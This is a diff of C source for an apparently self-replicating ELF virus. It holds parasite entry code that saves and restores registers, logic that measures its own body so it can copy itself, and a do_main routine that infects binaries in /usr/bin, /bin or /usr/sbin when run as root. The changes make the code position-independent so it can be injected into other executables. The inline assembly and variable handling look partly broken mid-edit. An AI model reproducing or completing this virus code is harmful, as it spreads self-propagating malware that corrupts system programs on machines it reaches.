@@ -31,26 +31,12 @@ typedef struct elfbin {
 	struct stat st;
 } elfbin_t;
 
-struct bootstrap_data bootstrap __attribute__((section(".data"))) = { 0x00 };
-
 #define DIR_COUNT 3
-static const char *dirs[] = {
-		"/usr/bin",
-		"/bin",
-		"/usr/sbin",
-		NULL
-		};
-
 
 _start()
 {
 	struct bootstrap_data bootstrap;
-	/*
-	 * Get argc, and char **argv
-	 */
-       	__ASM__ ("mov 0x08(%%rbp), %%rcx " : "=c" (bootstrap.argc));
-        __ASM__ ("lea 0x10(%%rbp), %%rcx " : "=c" (bootstrap.argv));
-	
+	//_printf("%x\n", bootstrap);
 	/*
 	 * Save register state before executing parasite
 	 * code.
@@ -72,34 +58,37 @@ _start()
 	 "push %r14	\n"
 	 "push %r15	  ");
 	
+	__ASM__ ("mov 0x08(%%rbp), %%rcx " : "=c" (bootstrap.argc));
+        __ASM__ ("lea 0x10(%%rbp), %%rcx " : "=c" (bootstrap.argv));
+
 	/*
 	 * Load bootstrap pointer as argument to do_main()
 	 * and call it.
 	 */
 	__ASM__ ( 
 	 "leaq %0, %%rdi\n"
-	 "call do_main	\n"
+	 "call do_main   " :: "g"(bootstrap)
 	);
 
 	/*
 	 * Restore register state
 	 */
 	asm __volatile__(
-	 "pop %%r15	\n"
-	 "pop %%r14	\n"
-	 "pop %%r13	\n"
-	 "pop %%r12	\n"
-	 "pop %%r11	\n"
-	 "pop %%r10	\n"
-	 "pop %%r9	\n"
-	 "pop %%r8	\n"
-	 "pop %%rdx	\n"
-	 "pop %%rcx	\n"
-	 "pop %%rbx	\n"
-	 "pop %%rax	\n"
-	 "pop %%rbp	\n"
-	 "pop %%rsp	\n"
-	 "jmp end_code	" :: "g"(bootstrap)
+	 "pop %r15	\n"
+	 "pop %r14	\n"
+	 "pop %r13	\n"
+	 "pop %r12	\n"
+	 "pop %r11	\n"
+	 "pop %r10	\n"
+	 "pop %r9	\n"
+	 "pop %r8	\n"
+	 "pop %rdx	\n"
+	 "pop %rcx	\n"
+	 "pop %rbx	\n"
+	 "pop %rax	\n"
+	 "pop %rbp	\n"
+	 "pop %rsp	\n"	
+	 "jmp end_code	" 
 	);
 }
 
@@ -135,16 +124,20 @@ void vx_free(uint8_t *mem)
  * We rely on ASLR to get our psuedo randomness, since RSP will be different
  * at each execution.
  */
+int _rand(long *seed) // RAND_MAX assumed to be 32767
+{
+        *seed = *seed * 1103515245 + 12345;
+        return (unsigned int)(*seed / 65536) & 32767;
+}
 
 uint32_t get_random_number(int max)
 {
 	long rsp;
         asm __volatile__("mov %%rsp, %0" : "=r"(rsp));
-	_srand(rsp);
-	return _rand() % max;
+	return _rand(&rsp) % max;
 }
 	
-char * randomly_select_dir(void) 
+char * randomly_select_dir(char **dirs) 
 {	
 	return (char *)dirs[get_random_number(DIR_COUNT)];
 }
@@ -302,25 +295,13 @@ int infect_elf_file(elfbin_t *self, elfbin_t *target)
 int load_self(elfbin_t *elf)
 {	
 	int i;
+	void (*f1)(void) = (void *)end_code; //(void (*)())end_code;
+	void (*f2)(void) = (void (*)())dummy_marker;
 	Elf64_Addr _start_addr = get_rip() - ((char *)&get_rip_label - (char *)&_start);
-	elf->mem = (void *)((long)_start_addr & ~4095);
-	elf->ehdr = (Elf64_Ehdr *)elf->mem;
-	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
-	for (i = 0; i < elf->ehdr->e_phnum; i++) {
-		if (elf->phdr[i].p_type == PT_LOAD)
-			switch(!!elf->phdr[i].p_offset) {
-				case 0:
-					elf->textVaddr = elf->phdr[i].p_vaddr;
-					elf->textSize = elf->phdr[i].p_memsz;
-					break;
-				case 1:
-					elf->dataVaddr = elf->phdr[i].p_vaddr;
-					elf->dataSize = elf->phdr[i].p_memsz;
-					break;
-			}
-			
-	}
-	elf->size = ((elf->dataVaddr + elf->dataSize) - _start_addr);
+	elf->mem = (uint8_t *)_start_addr;
+	elf->size = (char *)&end_code - (char *)&real_start; 
+	elf->size += (int)((char *)f2 - (char *)f1);
+	DEBUG_PRINT("end_code is %d bytes\n", (char *)f2 - (char *)f1);
 	return 0;
 }
 
@@ -408,8 +389,20 @@ void do_main(struct bootstrap_data *bootstrap)
 	mode_t mode;
 	uint32_t rnum;
 	elfbin_t self, target;
+	
+	/*
+	 * NOTE: 
+	 * we can't use string literals because they will be
+	 * stored in either .rodata or .data sections.
+	 */
+	char dirs[3][32] = {
+			{'/','u','s','r','/','b','i','n','\0'},
+			{'/','u','s','r','/','s','b','i','n','\0'},        
+			{'/','b','i','n','\0'}
+			};
+
 	_printf("bootstrap: %x\n", bootstrap);
-	dir = _getuid() != 0 ? "." : randomly_select_dir();
+	dir = _getuid() != 0 ? "." : randomly_select_dir((char **)dirs);
 	
 	DEBUG_PRINT("Infecting files in directory: %s\n", dir);
 	
@@ -468,9 +461,14 @@ unsigned long get_rip(void)
 }
 
 
-void end_code() {
-
+void end_code() 
+{
 	Exit(0);
 
+}
+
+void dummy_marker()
+{
+	__ASM__("nop");
 }
 
